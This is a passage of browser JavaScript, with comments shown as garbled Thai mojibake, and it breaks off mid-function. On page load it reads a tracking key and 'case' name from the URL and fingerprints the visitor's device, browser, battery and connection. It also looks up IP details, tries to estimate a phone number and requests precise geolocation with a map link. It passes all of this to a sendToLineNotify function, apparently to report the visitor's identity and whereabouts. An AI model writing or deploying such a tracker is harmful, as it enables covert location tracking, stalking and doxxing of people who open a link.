// ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏î‡∏∂‡∏á tracking key ‡πÅ‡∏•‡∏∞ case name ‡∏à‡∏≤‡∏Å URL parameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ñ‡πà‡∏≤";
    const caseName = urlParams.get('case') || "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ñ‡πà‡∏≤";
    
    console.log("‡∏î‡∏∂‡∏á‡∏Ñ‡πà‡∏≤‡∏à‡∏≤‡∏Å URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName);
    
    return {
      trackingKey: trackingKey,
      caseName: caseName
    };
  } catch (error) {
    console.error("‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏î‡∏∂‡∏á‡∏û‡∏≤‡∏£‡∏≤‡∏°‡∏¥‡πÄ‡∏ï‡∏≠‡∏£‡πå‡∏à‡∏≤‡∏Å URL ‡πÑ‡∏î‡πâ:", error);
    return {
      trackingKey: "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ñ‡πà‡∏≤",
      caseName: "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ñ‡πà‡∏≤"
    };
  }
}

// ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏´‡∏•‡∏±‡∏Å‡∏ó‡∏µ‡πà‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏ó‡∏±‡∏ô‡∏ó‡∏µ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÇ‡∏´‡∏•‡∏î‡∏´‡∏ô‡πâ‡∏≤‡πÄ‡∏ß‡πá‡∏ö
(function() {
  // ‡πÄ‡∏Å‡πá‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏±‡πà‡∏ß‡πÑ‡∏õ
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  
  // ‡∏î‡∏∂‡∏á tracking key ‡πÅ‡∏•‡∏∞ case name ‡∏à‡∏≤‡∏Å URL
  const { trackingKey, caseName } = getUrlParameters();

  // ‡πÄ‡∏Å‡πá‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå‡πÅ‡∏•‡∏∞‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏≠‡∏∑‡πà‡∏ô‡πÜ
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•";
  const language = navigator.language || navigator.userLanguage || "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•";
  const platform = navigator.platform || "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡πÅ‡∏ö‡∏ï‡πÄ‡∏ï‡∏≠‡∏£‡∏µ‡πà
  getBatteryInfo().then(batteryData => {
    // ‡∏£‡∏ß‡∏ö‡∏£‡∏ß‡∏°‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î
    const allDeviceData = {
      ...deviceInfo,
      screenSize,
      screenColorDepth,
      devicePixelRatio,
      language,
      platform,
      browser,
      connection,
      battery: batteryData
    };

    // ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏ï‡∏±‡∏ß‡πÅ‡∏õ‡∏£‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÄ‡∏Å‡πá‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏à‡∏∞‡∏™‡πà‡∏á
    let dataToSend = {};
    
    // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö IP ‡πÅ‡∏•‡∏∞‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÄ‡∏ö‡∏≠‡∏£‡πå‡πÇ‡∏ó‡∏£‡∏®‡∏±‡∏û‡∏ó‡πå
    Promise.all([
      getIPDetails().catch(error => ({ip: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ"})),
      estimatePhoneNumber().catch(() => null)
    ])
    .then(([ipData, phoneInfo]) => {
      // ‡πÄ‡∏Å‡πá‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏à‡∏≥‡πÄ‡∏õ‡πá‡∏ô‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î
      dataToSend = {
        timestamp: timestamp,
        ip: ipData,
        deviceInfo: allDeviceData,
        phoneInfo: phoneInfo,
        referrer: referrer,
        trackingKey: trackingKey || "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ñ‡πà‡∏≤",
        caseName: caseName || "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ñ‡πà‡∏≤",
        useServerMessage: true,
        requestId: generateUniqueId() // ‡∏™‡∏£‡πâ‡∏≤‡∏á ID ‡πÄ‡∏â‡∏û‡∏≤‡∏∞‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏£‡πâ‡∏≠‡∏á‡∏Ç‡∏≠‡∏ô‡∏µ‡πâ
      };
      
      // ‡∏Ç‡∏≠‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏û‡∏¥‡∏Å‡∏±‡∏î ‡πÇ‡∏î‡∏¢‡∏Å‡∏≥‡∏´‡∏ô‡∏î‡πÄ‡∏ß‡∏•‡∏≤‡πÉ‡∏´‡πâ‡∏ï‡∏≠‡∏ö‡∏Å‡∏•‡∏±‡∏ö‡πÑ‡∏°‡πà‡πÄ‡∏Å‡∏¥‡∏ô 5 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
      if (navigator.geolocation) {
        const locationPromise = new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve({
                lat: position.coords.latitude,
                long: position.coords.longitude,
                accuracy: position.coords.accuracy,
                gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
              });
            },
            error => {
              console.log("‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡πÑ‡∏°‡πà‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï‡πÉ‡∏´‡πâ‡πÄ‡∏Ç‡πâ‡∏≤‡∏ñ‡∏∂‡∏á‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á:", error.message);
              resolve("‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•");
            },
            {
              timeout: 5000,
              enableHighAccuracy: true
            }
          );
        });
        
        // ‡∏£‡∏≠‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏û‡∏¥‡∏Å‡∏±‡∏î‡πÑ‡∏°‡πà‡πÄ‡∏Å‡∏¥‡∏ô 5 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
        Promise.race([
          locationPromise,
          new Promise(resolve => setTimeout(() => resolve("‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•"), 5000))
        ])
        .then(location => {
          // ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏û‡∏¥‡∏Å‡∏±‡∏î‡πÄ‡∏Ç‡πâ‡∏≤‡πÑ‡∏õ‡πÉ‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏à‡∏∞‡∏™‡πà‡∏á
          dataToSend.location = location;
          
          // ‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡πÄ‡∏û‡∏µ‡∏¢‡∏á‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡πÄ‡∏î‡∏µ‡∏¢‡∏ß
          sendToLineNotify(dataToSend);
        });
      } else {
        // ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ Geolocation API ‡πÑ‡∏î‡πâ
        dataToSend.location = "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•";
        sendToLineNotify(dataToSend);
      }
    });
  });
})();

// ‡∏™‡∏£‡πâ‡∏≤‡∏á ID ‡πÄ‡∏â‡∏û‡∏≤‡∏∞‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏£‡πâ‡∏≠‡∏á‡∏Ç‡∏≠
function generateUniqueId() {
  // ‡∏™‡∏£‡πâ‡∏≤‡∏á ID ‡∏à‡∏≤‡∏Å‡πÄ‡∏ß‡∏•‡∏≤‡πÉ‡∏ô‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö base36 + random ‡∏Ñ‡πà‡∏≤ + ‡∏Ñ‡πà‡∏≤‡∏™‡∏∏‡πà‡∏°‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢
  const timestamp = Date.now().toString(36);
  const randomStr = Math.random().toString(36).substring(2, 10);
  const extraRandom = crypto && crypto.getRandomValues ? 
    Array.from(crypto.getRandomValues(new Uint8Array(2)), b => b.toString(16)).join('') : 
    Math.random().toString(36).slice(-4);
    
  return timestamp + randomStr + extraRandom;
}

// ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏£‡∏ß‡∏ö‡∏£‡∏ß‡∏°‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå‡πÅ‡∏ö‡∏ö‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•";
  const platform = navigator.platform || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö";
  
  // ‡πÇ‡∏Ñ‡∏£‡∏á‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
  const deviceInfo = {
    userAgent: userAgent,
    vendor: vendor,
    deviceType: "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
    deviceModel: "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
    platform: "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
    osVersion: "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
    browserEngine: "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö"
  };
  
  // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå‡∏î‡πâ‡∏ß‡∏¢ Regex ‡∏ó‡∏µ‡πà‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î‡∏°‡∏≤‡∏Å‡∏Ç‡∏∂‡πâ‡∏ô
  const tabletRegex = /(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i;
  const mobileRegex = /Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/i;
  
  if (tabletRegex.test(userAgent)) {
    deviceInfo.deviceType = "‡πÅ‡∏ó‡πá‡∏ö‡πÄ‡∏•‡πá‡∏ï";
  } else if (mobileRegex.test(userAgent)) {
    deviceInfo.deviceType = "‡∏°‡∏∑‡∏≠‡∏ñ‡∏∑‡∏≠";
  } else {
    deviceInfo.deviceType = "‡∏Ñ‡∏≠‡∏°‡∏û‡∏¥‡∏ß‡πÄ‡∏ï‡∏≠‡∏£‡πå";
  }
  
  // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏£‡∏∞‡∏ö‡∏ö‡∏õ‡∏è‡∏¥‡∏ö‡∏±‡∏ï‡∏¥‡∏Å‡∏≤‡∏£‡πÅ‡∏•‡∏∞‡πÄ‡∏ß‡∏≠‡∏£‡πå‡∏ä‡∏±‡∏ô
  if (/Windows NT 10.0/.test(userAgent)) {
    deviceInfo.platform = "Windows 10/11";
  } else if (/Windows NT 6.3/.test(userAgent)) {
    deviceInfo.platform = "Windows 8.1";
  } else if (/Windows NT 6.2/.test(userAgent)) {
    deviceInfo.platform = "Windows 8";
  } else if (/Windows NT 6.1/.test(userAgent)) {
    deviceInfo.platform = "Windows 7";
  } else if (/Mac OS X/.test(userAgent)) {
    const osxVersionMatch = userAgent.match(/Mac OS X (\d+[._]\d+[._]?\d*)/i);
    if (osxVersionMatch) {
      // ‡πÅ‡∏õ‡∏•‡∏á‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö‡πÄ‡∏ß‡∏≠‡∏£‡πå‡∏ä‡∏±‡∏ô‡πÉ‡∏´‡πâ‡πÄ‡∏õ‡πá‡∏ô‡∏ó‡∏µ‡πà‡∏≠‡πà‡∏≤‡∏ô‡∏á‡πà‡∏≤‡∏¢ 10_15_7 -> 10.15.7
      const osVersion = osxVersionMatch[1].replace(/_/g, '.');
      deviceInfo.platform = `macOS ${osVersion}`;
      
      // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ä‡∏∑‡πà‡∏≠ macOS ‡∏ï‡∏≤‡∏°‡πÄ‡∏ß‡∏≠‡∏£‡πå‡∏ä‡∏±‡∏ô
      const majorVersion = parseInt(osVersion.split('.')[0], 10);
      const minorVersion = parseInt(osVersion.split('.')[1], 10);
      
      if (majorVersion >= 13) {
        deviceInfo.platform = `macOS Ventura ‡∏´‡∏£‡∏∑‡∏≠‡πÉ‡∏´‡∏°‡πà‡∏Å‡∏ß‡πà‡∏≤ (${osVersion})`;
      } else if (majorVersion === 12) {
        deviceInfo.platform = `macOS Monterey (${osVersion})`;
      } else if (majorVersion === 11) {
        deviceInfo.platform = `macOS Big Sur (${osVersion})`;
      } else if (majorVersion === 10 && minorVersion === 15) {
        deviceInfo.platform = `macOS Catalina (${osVersion})`;
      } else if (majorVersion === 10 && minorVersion === 14) {
        deviceInfo.platform = `macOS Mojave (${osVersion})`;
      }
    } else {
      deviceInfo.platform = "macOS";
    }
  } else if (/Linux/.test(userAgent) && !/Android/.test(userAgent)) {
    deviceInfo.platform = "Linux";
    // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö Linux distro ‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°
    if (/Ubuntu/.test(userAgent)) {
      deviceInfo.platform = "Ubuntu Linux";
    } else if (/Fedora/.test(userAgent)) {
      deviceInfo.platform = "Fedora Linux";
    } else if (/Debian/.test(userAgent)) {
      deviceInfo.platform = "Debian Linux";
    }
  } else if (/Android/.test(userAgent)) {
    const androidVersionMatch = userAgent.match(/Android (\d+(\.\d+)+)/);
    if (androidVersionMatch) {
      deviceInfo.platform = `Android ${androidVersionMatch[1]}`;
      deviceInfo.osVersion = androidVersionMatch[1];
    } else {
      deviceInfo.platform = "Android";
    }
  } else if (/iPhone|iPad|iPod/.test(userAgent)) {
    const iosVersionMatch = userAgent.match(/OS (\d+[._]\d+[._]?\d*) like Mac OS X/);
    if (iosVersionMatch) {
      const iosVersion = iosVersionMatch[1].replace(/_/g, '.');
      deviceInfo.platform = `iOS ${iosVersion}`;
      deviceInfo.osVersion = iosVersion;
    } else {
      deviceInfo.platform = "iOS";
    }
  } else if (/CrOS/.test(userAgent)) {
    deviceInfo.platform = "Chrome OS";
  }
  
  // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏£‡∏∏‡πà‡∏ô‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå‡πÅ‡∏ö‡∏ö‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î
  // ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö iPhone
  if (/iPhone/.test(userAgent)) {
    const models = {
      // iPhone X, XR, XS series
      "iPhone1[0-3],[1-8]": "iPhone X/XR/XS Series",
      // iPhone 11 series
      "iPhone1[2-4],[1-8]": "iPhone 11 Series",
      // iPhone 12 series
      "iPhone1[3-4],[1-8]": "iPhone 12 Series",
      // iPhone 13 series
      "iPhone1[4-5],[1-8]": "iPhone 13 Series",
      // iPhone 14 series
      "iPhone1[5-6],[1-8]": "iPhone 14 Series",
      // iPhone 15 series
      "iPhone1[6-7],[1-8]": "iPhone 15 Series",
    };
    
    // ‡∏£‡∏∞‡∏ö‡∏∏ iPhone ‡∏£‡∏∏‡πà‡∏ô‡∏ï‡∏≤‡∏°‡∏Ç‡∏ô‡∏≤‡∏î‡∏´‡∏ô‡πâ‡∏≤‡∏à‡∏≠‡πÅ‡∏•‡∏∞‡πÄ‡∏ß‡∏≠‡∏£‡πå‡∏ä‡∏±‡∏ô iOS
    if (window.screen) {
      const { width, height } = window.screen;
      const maxDimension = Math.max(width, height);
      
      if (maxDimension >= 900) { // iPhone Plus/Pro Max models
        deviceInfo.deviceModel = "iPhone (‡∏£‡∏∏‡πà‡∏ô‡πÉ‡∏´‡∏ç‡πà Plus/Pro Max)";
      } else if (maxDimension >= 800) { // iPhone standard/Pro models
        deviceInfo.deviceModel = "iPhone (‡∏£‡∏∏‡πà‡∏ô‡∏°‡∏≤‡∏ï‡∏£‡∏ê‡∏≤‡∏ô/Pro)";
      } else if (maxDimension >= 700) { // iPhone mini/SE models
        deviceInfo.deviceModel = "iPhone (‡∏£‡∏∏‡πà‡∏ô‡πÄ‡∏•‡πá‡∏Å mini/SE)";
      } else {
        deviceInfo.deviceModel = "iPhone";
      }
    } else {
      deviceInfo.deviceModel = "iPhone";
    }
    
    // ‡∏î‡∏π‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°‡∏à‡∏≤‡∏Å User Agent
    for (const [modelRegex, modelName] of Object.entries(models)) {
      if (new RegExp(modelRegex).test(userAgent)) {
        deviceInfo.deviceModel = modelName;
        break;
      }
    }
  }
  // ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö iPad
  else if (/iPad/.test(userAgent)) {
    if (/iPad Pro/.test(userAgent)) {
      deviceInfo.deviceModel = "iPad Pro";
    } else if (/iPad Air/.test(userAgent)) {
      deviceInfo.deviceModel = "iPad Air";
    } else if (/iPad mini/.test(userAgent)) {
      deviceInfo.deviceModel = "iPad mini";
    } else {
      deviceInfo.deviceModel = "iPad";
    }
  }
  // ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö Android
  else if (/Android/.test(userAgent)) {
    // ‡∏î‡∏∂‡∏á‡∏ä‡∏∑‡πà‡∏≠‡∏£‡∏∏‡πà‡∏ô‡∏à‡∏≤‡∏Å User Agent
    const androidDeviceMatch = userAgent.match(/Android [0-9\.]+; ([^;)]+)/i);
    
    if (androidDeviceMatch) {
      let model = androidDeviceMatch[1].trim();
      
      // ‡∏ï‡∏±‡∏î‡∏Ñ‡∏≥‡∏ß‡πà‡∏≤ "Build" ‡∏≠‡∏≠‡∏Å ‡∏ñ‡πâ‡∏≤‡∏°‡∏µ
      if (model.includes("Build")) {
        model = model.substring(0, model.indexOf("Build")).trim();
      }
      
      // ‡∏£‡∏∞‡∏ö‡∏∏‡πÅ‡∏ö‡∏£‡∏ô‡∏î‡πå‡πÅ‡∏•‡∏∞‡πÇ‡∏°‡πÄ‡∏î‡∏•
      if (/samsung/i.test(model)) {
        if (/SM-G9/i.test(model) || /SM-N9/i.test(model) || /SM-S/i.test(model) || /Galaxy S/i.test(model) || /Galaxy Note/i.test(model)) {
          deviceInfo.deviceModel = `Samsung Galaxy (High-end: ${model})`;
        } else if (/SM-A/i.test(model) || /Galaxy A/i.test(model)) {
          deviceInfo.deviceModel = `Samsung Galaxy (Mid-range: ${model})`;
        } else if (/SM-J/i.test(model) || /Galaxy J/i.test(model)) {
          deviceInfo.deviceModel = `Samsung Galaxy (Budget: ${model})`;
        } else {
          deviceInfo.deviceModel = `Samsung ${model}`;
        }
      } else if (/huawei/i.test(model) || /HUAWEI/i.test(model)) {
        deviceInfo.deviceModel = `Huawei ${model}`;
      } else if (/xiaomi/i.test(model) || /Redmi/i.test(model)) {
        deviceInfo.deviceModel = `Xiaomi ${model}`;
      } else if (/oppo/i.test(model) || /OPPO/i.test(model)) {
        deviceInfo.deviceModel = `OPPO ${model}`;
      } else if (/vivo/i.test(model) || /vivo/i.test(model)) {
        deviceInfo.deviceModel = `Vivo ${model}`;
      } else if (/oneplus/i.test(model) || /OnePlus/i.test(model)) {
        deviceInfo.deviceModel = `OnePlus ${model}`;
      } else if (/pixel/i.test(model) || /Pixel/i.test(model)) {
        deviceInfo.deviceModel = `Google Pixel ${model}`;
      } else if (/nokia/i.test(model) || /Nokia/i.test(model)) {
        deviceInfo.deviceModel = `Nokia ${model}`;
      } else {
        deviceInfo.deviceModel = model;
      }
    } else {
      deviceInfo.deviceModel = "Android Device";
    }
  }
  
  // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö browser engine
  if (/Trident|MSIE/.test(userAgent)) {
    deviceInfo.browserEngine = "Trident (IE)";
  } else if (/Edg/.test(userAgent)) {
    deviceInfo.browserEngine = "Blink (Chromium Edge)";
  } else if (/Chrome/.test(userAgent)) {
    deviceInfo.browserEngine = "Blink (Chromium)";
  } else if (/Safari/.test(userAgent)) {
    deviceInfo.browserEngine = "WebKit (Safari)";
  } else if (/Firefox|FxiOS/.test(userAgent)) {
    deviceInfo.browserEngine = "Gecko (Firefox)";
  }
  
  // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°‡∏î‡πâ‡∏ß‡∏¢ Client Hints API (‡∏ñ‡πâ‡∏≤‡πÄ‡∏ö‡∏£‡∏≤‡∏ß‡πå‡πÄ‡∏ã‡∏≠‡∏£‡πå‡∏£‡∏≠‡∏á‡∏£‡∏±‡∏ö)
  try {
    if (navigator.userAgentData) {
      // ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏û‡∏∑‡πâ‡∏ô‡∏ê‡∏≤‡∏ô
      deviceInfo.isMobile = navigator.userAgentData.mobile;
      
      // ‡∏≠‡∏±‡∏õ‡πÄ‡∏î‡∏ï‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå‡∏à‡∏≤‡∏Å User-Agent Client Hints
      if (typeof deviceInfo.isMobile === 'boolean') {
        if (deviceInfo.isMobile === true && deviceInfo.deviceType !== "‡πÅ‡∏ó‡πá‡∏ö‡πÄ‡∏•‡πá‡∏ï") {
          deviceInfo.deviceType = "‡∏°‡∏∑‡∏≠‡∏ñ‡∏∑‡∏≠";
        } else if (deviceInfo.isMobile === false) {
          deviceInfo.deviceType = "‡∏Ñ‡∏≠‡∏°‡∏û‡∏¥‡∏ß‡πÄ‡∏ï‡∏≠‡∏£‡πå";
        }
      }
      
      // ‡∏£‡πâ‡∏≠‡∏á‡∏Ç‡∏≠‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• high-entropy values ‡∏ñ‡πâ‡∏≤‡πÄ‡∏ö‡∏£‡∏≤‡∏ß‡πå‡πÄ‡∏ã‡∏≠‡∏£‡πå‡∏£‡∏≠‡∏á‡∏£‡∏±‡∏ö
      if (navigator.userAgentData.getHighEntropyValues) {
        navigator.userAgentData.getHighEntropyValues([
          "platform", "platformVersion", "architecture", 
          "model", "uaFullVersion", "fullVersionList"
        ]).then(ua => {
          // ‡∏≠‡∏±‡∏õ‡πÄ‡∏î‡∏ï‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå‡∏î‡πâ‡∏ß‡∏¢‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡πÅ‡∏°‡πà‡∏ô‡∏¢‡∏≥‡∏Å‡∏ß‡πà‡∏≤
          if (ua.platform) deviceInfo.platformFromClientHints = ua.platform;
          if (ua.platformVersion) deviceInfo.platformVersionFromClientHints = ua.platformVersion;
          if (ua.model) deviceInfo.modelFromClientHints = ua.model;
          if (ua.architecture) deviceInfo.architecture = ua.architecture;
          
          // ‡∏≠‡∏±‡∏õ‡πÄ‡∏î‡∏ï‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÅ‡∏û‡∏•‡∏ï‡∏ü‡∏≠‡∏£‡πå‡∏°‡∏ñ‡πâ‡∏≤‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î‡∏Å‡∏ß‡πà‡∏≤
          if (ua.platform && ua.platformVersion) {
            let platformInfo = `${ua.platform} ${ua.platformVersion}`;
            if (deviceInfo.platform === "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö" || ua.platform !== "Android") {
              deviceInfo.platform = platformInfo;
            }
          }
          
          // ‡∏≠‡∏±‡∏õ‡πÄ‡∏î‡∏ï‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏£‡∏∏‡πà‡∏ô‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå‡∏ñ‡πâ‡∏≤‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î‡∏Å‡∏ß‡πà‡∏≤
          if (ua.model && ua.model !== "") {
            deviceInfo.deviceModel = ua.model;
          }
          
          // ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÄ‡∏ö‡∏£‡∏≤‡∏ß‡πå‡πÄ‡∏ã‡∏≠‡∏£‡πå‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î
          if (ua.fullVersionList && ua.fullVersionList.length > 0) {
            deviceInfo.detailedBrowserInfo = ua.fullVersionList;
          }
        }).catch(e => {
          console.log("‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• High-entropy User-Agent Client Hints:", e);
        });
      }
    }
  } catch (e) {
    console.log("‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô User-Agent Client Hints API:", e);
  }
  
  return deviceInfo;
}

// ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡πÅ‡∏ö‡∏ö‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  
  let connectionInfo = {
    type: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ",
    effectiveType: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ",
